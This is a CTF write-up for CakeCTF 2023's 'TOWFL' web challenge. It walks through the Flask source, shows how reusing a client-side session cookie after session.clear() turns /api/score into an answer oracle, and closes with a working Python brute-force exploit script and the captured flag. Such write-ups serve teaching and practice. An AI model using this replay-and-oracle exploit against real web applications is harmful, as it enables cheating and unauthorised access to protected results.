# TOWFL - Test of Wolf as a Foreign Language

This challenge consists of a web application which provides a set of questions and answers to provide in order to get the flag:
more specificly, there are 10 "challenges" each consisting of 10 multiple choice questions, 4 possible answers per question.

`app.py`

```python
@app.route("/api/start", methods=['POST'])
def api_start():
    if 'eid' in flask.session:
        eid = flask.session['eid']
    else:
        eid = flask.session['eid'] = os.urandom(32).hex()

    # Create new challenge set
    db().set(eid, json.dumps([new_challenge() for _ in range(10)]))
    return {'status': 'ok'}
```

```python
def new_challenge():
    """Create new questions for a passage"""
    p = '\n'.join([lorem.paragraph() for _ in range(random.randint(5, 15))])
    qs, ans, res = [], [], []
    for _ in range(10):
        q = lorem.sentence().replace(".", "?")
        op = [lorem.sentence() for _ in range(4)]
        qs.append({'question': q, 'options': op})
        ans.append(random.randrange(0, 4))
        res.append(False)
    return {'passage': p, 'questions': qs, 'answers': ans, 'results': res}
```

```python
@app.route("/api/score", methods=['GET'])
def api_score():
    if 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    # Calculate score
    challs = json.loads(db().get(flask.session['eid']))
    score = 0
    for chall in challs:
        for result in chall['results']:
            if result is True:
                score += 1

    # Is he/she worth giving the flag?
    if score == 100:
        flag = os.getenv("FLAG")
    else:
        flag = "Get perfect score for flag"

    # Prevent reply attack
    flask.session.clear()

    return {'status': 'ok', 'data': {'score': score, 'flag': flag}}
```

As shown in the source code, the application is returning the flag if the user is able to answer correctly to each question and so obtain `score=100`. The problem is that questions and answers are just completely random text, and the correct answer is randomly chosen among the four possible answers.

```python
@app.route("/api/submit", methods=['POST'])
def api_submit():
    if 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    try:
        answers = flask.request.get_json()
    except:
        return {'status': 'error', 'reason': 'Invalid request.'}

    # Get answers
    eid = flask.session['eid']
    challs = json.loads(db().get(eid))
    if not isinstance(answers, list) \
       or len(answers) != len(challs):
        return {'status': 'error', 'reason': 'Invalid request.'}

    # Check answers
    for i in range(len(answers)):
        if not isinstance(answers[i], list) \
           or len(answers[i]) != len(challs[i]['answers']):
            return {'status': 'error', 'reason': 'Invalid request.'}

        for j in range(len(answers[i])):
            challs[i]['results'][j] = answers[i][j] == challs[i]['answers'][j]

    # Store information with results
    db().set(eid, json.dumps(challs))
    return {'status': 'ok'}
```

Looking at client-side code we see that when the answer are submitted by the user, the web application is sending the 10x10 matrix of answers to the API server (`/api/submit`) and after that is again invoking the API server to fetch the results (`/api/score`)

```javascript
async function submitAnswers() {
  // Submit answers
  let res = await fetch("/api/submit", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(submission),
  });
  if (!res.ok) {
    alert("Server error");
    return;
  }
  let json = await res.json();
  if (json.status !== "ok") {
    alert(`Server error: ${json.reason}`);
    return;
  }

  // Get score
  res = await fetch("/api/score", {
    method: "GET",
    credentials: "include",
  });
  if (!res.ok) {
    alert("Server error");
    return;
  }
  json = await res.json();
  if (json.status !== "ok") {
    alert(`Server error: ${json.reason}`);
    return;
  }

  // Display score
  document.getElementById("exam").hidden = true;
  document.getElementById("score-value").innerText = `${json.data.score}`;
  document.getElementById("flag").innerText = json.data.flag;
  document.getElementById("score").hidden = false;
}
```

if we look again at how the `api_submit()` and `api_score()` are implemented we notice that:

1. `api_submit()` can be invoked anytime, and it will accept in the body the whole matrix of answers; everytime it is called, it will retrieve the corresponding user's exam data from the database and check for each given answer if it is correct or not and then store again inside the database, for each answer, the **result** of this check **(True/False)**:
    
    ```python
    challs[i]['results'][j] = answers[i][j] == challs[i]['answers'][j]

    # Store information with results
    db().set(eid, json.dumps(challs))
    ```

2. `api_score()` will retrieve the exam data from the database and check for each answer if the previously computed **result** is True or False: anytime the answer stored **result** is True, the score is incremented by one:
   
   ```python
    # Calculate score
    challs = json.loads(db().get(flask.session['eid']))
    score = 0
    for chall in challs:
        for result in chall['results']:
            if result is True:
                score += 1
   ```

    - this function should be theoretically invoked only once the exam is finished and then, for that specific user `eid` and **exam** and after that all the associated exam data should be deleted from the database in order to avoid replay attacks:

        ```python
         # Prevent reply attack
        flask.session.clear()
        ```
    - the vulnerability of the application is determined by the previous line of code: `session.clear()` is not deleting the actual session, but only erasing that specific session's data (answers validation data in particular)
  
This implies that `api_submit()` can be invoked during the exam to check if each given answer is the correct one or not, until all the complete answers are found.
This is achievable by simply calling, after each answer is submitted, `api_score()` to check if the score is increased or not from the previous value.

The exploit:

```python
import requests

start_exam_url = "http://towfl.2023.cakectf.com:8888/api/start"
start_exam = requests.post(start_exam_url)
session = start_exam.cookies.get_dict()["session"] 
cookie = {"session": session}

update_score_url = "http://towfl.2023.cakectf.com:8888/api/submit"
get_score_url = "http://towfl.2023.cakectf.com:8888/api/score"

answers = [["null"] * 10 for _ in range(10)]
score = 0

for i in range(10):
    for j in range(10):
        for new_answer in range(4):
            answers[i][j] = new_answer
            update_score = requests.post(url=update_score_url, cookies=cookie, json=answers)
            if update_score.status_code == 200:
                get_score = requests.get(url=get_score_url, cookies=cookie)
                if get_score.status_code == 200:
                    response = get_score.json()
                    if response["data"]["score"] == score + 1:
                        print(f"found a new valid answer for question #{j} of challenge #{i}")
                        score += 1
                        if response["data"]["score"] == 100:
                            print(response["data"])
                        break                    
```
```json
{'flag': '"CakeCTF{b3_c4ut10us_1f_s3ss10n_1s_cl13nt_s1d3_0r_s3rv3r_s1d3}"', 'score': 100} 
```